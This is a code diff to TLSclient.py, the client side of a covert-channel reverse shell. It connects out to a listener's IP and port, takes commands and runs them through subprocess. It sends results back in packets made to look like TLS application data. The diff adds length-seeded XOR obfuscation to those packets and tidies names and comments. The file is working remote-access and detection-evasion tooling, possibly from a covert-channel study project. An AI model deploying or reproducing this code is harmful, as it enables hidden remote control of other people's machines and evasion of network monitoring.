@@ -1,6 +1,15 @@
+##
+# @file TLSclient.py
+# 
+# @brief this file contains packets for the TLS covert channel
+#           intended to run on the client side. 
+
+
+import random
 import socket
 import argparse
 import subprocess
+
 
 def encodePacket(data):
     """! This function encodes the data into a TLS packet.
@@ -11,10 +20,16 @@ def encodePacket(data):
     """
     tlsHeader = bytes([0x17,0x03,0x01])
     length = len(data)
+    random.seed(length)
+    temp = []
+    for d in data:
+        rand = random.randrange(256)
+        temp.append(d ^ rand)
+    data = bytearray(temp)
     toSend = tlsHeader + length.to_bytes(2, 'big') + data
     return toSend
 
-def recievePacket(sock):
+def receivePacket(sock):
     """! This function receives a packet from the client.
 
     @param sock  The socket descriptor to read from.
@@ -23,8 +38,16 @@ def recievePacket(sock):
     """
     data = bytearray() 
     headIn = sock.recv(5)
+    
     lenfromhead = int.from_bytes(headIn[3:], "big")
-    return sock.recv(lenfromhead)
+    data = sock.recv(lenfromhead)
+    random.seed(lenfromhead)
+    temp = []
+    for d in data:
+        rand = random.randrange(256)
+        temp.append(d ^ rand)
+    data = bytearray(temp)
+    return data
 
 
 def run(ip, port):
@@ -49,7 +72,7 @@ def run(ip, port):
 
     while True:
         ## Command received fro the server
-        commandIn = recievePacket(sock).decode("utf-8").split()
+        commandIn = receivePacket(sock).decode("utf-8").split()
         if commandIn[0] == "exit":
             print("EXITING...")
             sock.close()
@@ -64,7 +87,9 @@ def run(ip, port):
             sock.send(encodePacket(toSend))
 
 
-
+##
+# Sets this file up to be run by the command line. 
+#
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Start a reverse shell to connect to listiner.',
                                  usage="\n"
